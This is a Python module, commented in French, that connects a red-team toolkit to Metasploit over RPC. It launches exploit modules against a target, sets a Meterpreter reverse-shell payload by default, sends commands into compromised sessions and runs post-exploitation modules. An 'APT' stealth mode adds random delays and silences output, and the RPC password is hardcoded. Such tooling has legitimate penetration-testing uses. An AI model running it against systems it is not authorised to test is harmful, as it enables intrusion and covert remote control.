#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Connecteur pour Metasploit Framework - Le framework d'exploitation
Version avec support furtif, APT et intégration avancée
"""

import json
import time
import random
from typing import Dict, Any, List, Optional, Tuple
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, field

from src.connectors.base_connector import BaseConnector


@dataclass
class MetasploitConfig:
    """Configuration pour Metasploit"""
    host: str = "127.0.0.1"
    port: int = 55553
    password: str = "RedForge2024"
    ssl: bool = False
    timeout: int = 30
    retry_count: int = 3
    auto_start_rpc: bool = True


class MetasploitConnector(BaseConnector):
    """Connecteur avancé pour Metasploit Framework avec support furtif"""
    
    def __init__(self, config: Optional[MetasploitConfig] = None):
        """
        Initialise le connecteur Metasploit
        
        Args:
            config: Configuration Metasploit
        """
        self.config = config or MetasploitConfig()
        self.client = None
        self.rpc_process = None
        self.active_jobs = {}
        self._temp_files = []
        
        super().__init__()
    
    def _find_tool(self) -> Optional[str]:
        """Trouve l'exécutable Metasploit"""
        import shutil
        
        paths = [
            "msfconsole",
            "/usr/bin/msfconsole",
            "/usr/local/bin/msfconsole",
            "/opt/metasploit-framework/bin/msfconsole",
            "/opt/metasploit/msfconsole"
        ]
        
        for path in paths:
            if path and shutil.which(path):
                return path
        
        return None
    
    def _connect_rpc(self) -> bool:
        """Établit la connexion RPC avec Metasploit"""
        if self.client:
            return True
        
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            
            self.client = MsfRpcClient(
                self.config.password,
                server=self.config.host,
                port=self.config.port,
                ssl=self.config.ssl
            )
            return True
        except ImportError:
            if not self.apt_mode:
                print("⚠️  pymetasploit3 non installé. Installation: pip install pymetasploit3")
            return False
        except Exception as e:
            if not self.apt_mode:
                print(f"❌ Erreur connexion Metasploit RPC: {e}")
            return False
    
    def start_rpc_server(self, force: bool = False) -> bool:
        """
        Démarre le serveur RPC de Metasploit
        
        Args:
            force: Forcer le redémarrage même si déjà actif
        """
        if self.rpc_process and not force:
            return True
        
        import subprocess
        
        try:
            cmd = [
                "msfrpcd",
                "-P", self.config.password,
                "-p", str(self.config.port)
            ]
            
            if not self.config.ssl:
                cmd.append("-S")
            
            # Mode silencieux en APT
            if self.apt_mode:
                cmd.append("-q")
            
            self.rpc_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Attendre le démarrage
            for _ in range(self.config.timeout):
                time.sleep(1)
                if self._connect_rpc():
                    return True
            
            return False
        except Exception as e:
            if not self.apt_mode:
                print(f"❌ Erreur démarrage serveur RPC: {e}")
            return False
    
    def stop_rpc_server(self) -> bool:
        """Arrête le serveur RPC de Metasploit"""
        if self.rpc_process:
            self.rpc_process.terminate()
            self.rpc_process = None
            self.client = None
            return True
        return False
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Lance un scan ou exploit via Metasploit
        
        Args:
            target: Cible
            **kwargs:
                - module: Module Metasploit à utiliser
                - payload: Payload à utiliser
                - options: Options du module
                - lhost: IP locale pour reverse shell
                - lport: Port pour reverse shell
                - timeout: Timeout en secondes
        """
        if not self.available:
            return {
                "success": False,
                "error": "Metasploit non installé",
                "sessions": [],
                "apt_mode": self.apt_mode
            }
        
        # Appliquer le délai furtif
        self._apply_stealth_delay()
        
        # Démarrer RPC si nécessaire
        if self.config.auto_start_rpc and not self.client:
            if not self.start_rpc_server():
                return {
                    "success": False,
                    "error": "Impossible de démarrer le serveur RPC Metasploit",
                    "sessions": []
                }
        
        if not self._connect_rpc():
            return {
                "success": False,
                "error": "Impossible de se connecter à Metasploit RPC",
                "sessions": []
            }
        
        module_name = kwargs.get('module')
        if not module_name:
            return {
                "success": False,
                "error": "Aucun module spécifié",
                "sessions": []
            }
        
        try:
            # Charger le module
            module = self.client.modules.use('exploit', module_name)
            
            # Configurer les options
            options = kwargs.get('options', {})
            options['RHOSTS'] = target
            
            for key, value in options.items():
                module[key] = value
            
            # Configurer le payload
            payload_name = kwargs.get('payload', 'windows/meterpreter/reverse_tcp')
            if payload_name and payload_name != 'none':
                module.payload = payload_name
                
                # Configurer les options du payload
                lhost = kwargs.get('lhost', self._get_local_ip())
                lport = kwargs.get('lport', 4444)
                module['LHOST'] = lhost
                module['LPORT'] = lport
            
            # Options avancées pour mode furtif
            if self.apt_mode:
                # Réduire l'agressivité
                if 'Delay' in module.options:
                    module['Delay'] = random.randint(1, 5)
                if 'Threads' in module.options:
                    module['Threads'] = 1
                if 'Timeout' in module.options:
                    module['Timeout'] = 60
            
            # Exécuter l'exploit
            timeout = kwargs.get('timeout', self.config.timeout)
            
            # Job ID pour suivi
            job_id = module.execute(
                payload=payload_name if payload_name and payload_name != 'none' else None,
                options=options
            )
            
            self.active_jobs[job_id] = {
                'module': module_name,
                'target': target,
                'start_time': datetime.now().isoformat()
            }
            
            # Attendre les résultats
            wait_time = kwargs.get('wait_time', 5)
            time.sleep(wait_time)
            
            # Récupérer les sessions
            sessions = self._get_sessions()
            
            return {
                "success": True,
                "target": target,
                "module": module_name,
                "payload": payload_name if payload_name != 'none' else None,
                "job_id": job_id,
                "sessions": sessions,
                "sessions_count": len(sessions),
                "execution_time": wait_time,
                "apt_mode": self.apt_mode
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "sessions": [],
                "apt_mode": self.apt_mode
            }
    
    def parse_output(self, output: str) -> Dict[str, Any]:
        """Parse la sortie de Metasploit"""
        return {
            "raw": output,
            "has_session": "Meterpreter session" in output,
            "has_shell": "Command shell session" in output,
            "has_error": "Exploit failed" in output or "Error" in output
        }
    
    def _get_sessions(self) -> List[Dict[str, Any]]:
        """Récupère la liste des sessions actives"""
        if not self.client:
            return []
        
        sessions = []
        for session_id, session_info in self.client.sessions.list.items():
            sessions.append({
                "id": session_id,
                "type": session_info.get('type', 'unknown'),
                "target": session_info.get('target_host', 'unknown'),
                "username": session_info.get('username', 'unknown'),
                "platform": session_info.get('platform', 'unknown'),
                "arch": session_info.get('arch', 'unknown'),
                "created": session_info.get('created', 'unknown')
            })
        
        return sessions
    
    def _get_local_ip(self) -> str:
        """Récupère l'IP locale"""
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def exploit(self, target: str, module: str, **options) -> Dict[str, Any]:
        """
        Lance un exploit spécifique
        
        Args:
            target: Cible
            module: Module Metasploit
            **options: Options supplémentaires
        """
        return self.scan(target, module=module, options=options)
    
    def get_sessions(self) -> List[Dict[str, Any]]:
        """Récupère toutes les sessions actives"""
        self._connect_rpc()
        return self._get_sessions()
    
    def interact_session(self, session_id: int, command: str) -> Dict[str, Any]:
        """
        Interagit avec une session
        
        Args:
            session_id: ID de la session
            command: Commande à exécuter
        """
        if not self._connect_rpc():
            return {"success": False, "error": "Connexion RPC échouée"}
        
        try:
            session = self.client.sessions.session(str(session_id))
            result = session.write(command + "\n")
            time.sleep(0.5)
            output = session.read()
            
            return {
                "success": True,
                "session_id": session_id,
                "command": command,
                "output": output,
                "apt_mode": self.apt_mode
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def stop_session(self, session_id: int) -> bool:
        """
        Arrête une session
        
        Args:
            session_id: ID de la session
        """
        if not self._connect_rpc():
            return False
        
        try:
            self.client.sessions.stop(str(session_id))
            return True
        except:
            return False
    
    def stop_all_sessions(self) -> int:
        """Arrête toutes les sessions actives"""
        sessions = self.get_sessions()
        stopped = 0
        for session in sessions:
            if self.stop_session(session['id']):
                stopped += 1
        return stopped
    
    def search_exploit(self, keyword: str, limit: int = 50) -> List[Dict[str, Any]]:
        """
        Recherche des exploits par mot-clé
        
        Args:
            keyword: Mot-clé de recherche
            limit: Nombre maximum de résultats
        """
        if not self._connect_rpc():
            return []
        
        try:
            results = self.client.modules.search(keyword)
            return [
                {
                    "name": mod[0],
                    "fullname": mod[1],
                    "rank": mod[2],
                    "description": mod[3][:200] if len(mod) > 3 else ""
                }
                for mod in results[:limit]
            ]
        except:
            return []
    
    def get_module_info(self, module_name: str) -> Dict[str, Any]:
        """
        Récupère les informations d'un module
        
        Args:
            module_name: Nom du module
        """
        if not self._connect_rpc():
            return {}
        
        try:
            module = self.client.modules.use('exploit', module_name)
            return {
                "name": module_name,
                "description": module.description,
                "options": list(module.options.keys()),
                "payloads": module.payloads[:20] if module.payloads else [],
                "targets": module.targets if hasattr(module, 'targets') else []
            }
        except:
            return {}
    
    def run_post_module(self, session_id: int, module: str, **options) -> Dict[str, Any]:
        """
        Exécute un module post-exploitation
        
        Args:
            session_id: ID de la session
            module: Module post à exécuter
            **options: Options du module
        """
        if not self._connect_rpc():
            return {"success": False, "error": "Connexion RPC échouée"}
        
        try:
            post_module = self.client.modules.use('post', module)
            post_module['SESSION'] = session_id
            
            for key, value in options.items():
                post_module[key] = value
            
            job_id = post_module.execute()
            
            return {
                "success": True,
                "module": module,
                "session_id": session_id,
                "job_id": job_id
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_job_status(self, job_id: int) -> Dict[str, Any]:
        """
        Récupère le statut d'un job
        
        Args:
            job_id: ID du job
        """
        if not self._connect_rpc():
            return {"success": False, "error": "Connexion RPC échouée"}
        
        try:
            job_info = self.client.jobs.info(str(job_id))
            return {
                "success": True,
                "job_id": job_id,
                "running": job_info.get('running', False),
                "info": job_info
            }
        except:
            return {"success": False, "job_id": job_id, "running": False}
    
    def stop_job(self, job_id: int) -> bool:
        """
        Arrête un job
        
        Args:
            job_id: ID du job
        """
        if not self._connect_rpc():
            return False
        
        try:
            self.client.jobs.stop(str(job_id))
            return True
        except:
            return False
    
    def get_version_info(self) -> Dict[str, Any]:
        """
        Récupère les informations de version de Metasploit
        
        Returns:
            Dictionnaire avec les informations de version
        """
        if not self.available:
            return {"available": False}
        
        if self._connect_rpc():
            try:
                version = self.client.core.version
                return {
                    "available": True,
                    "version": version.get('version', 'unknown'),
                    "api_version": version.get('api_version', 'unknown'),
                    "ruby_version": version.get('ruby_version', 'unknown'),
                    "tool": "metasploit",
                    "path": self.tool_path
                }
            except:
                pass
        
        result = self.execute_command([self.tool_path, "--version"], stealth=False)
        
        if result["success"]:
            version_line = result["stdout"].split('\n')[0] if result["stdout"] else ""
            return {
                "available": True,
                "version": version_line,
                "tool": "metasploit",
                "path": self.tool_path
            }
        
        return {"available": False, "error": result.get("error")}
    
    def cleanup(self):
        """Nettoie les ressources (sessions, jobs, RPC)"""
        self.stop_all_sessions()
        for job_id in list(self.active_jobs.keys()):
            self.stop_job(job_id)
        self.stop_rpc_server()
        self._cleanup_temp_files()
    
    def _cleanup_temp_files(self):
        """Nettoie les fichiers temporaires"""
        for file in self._temp_files:
            self.cleanup_temp_file(file)
        self._temp_files = []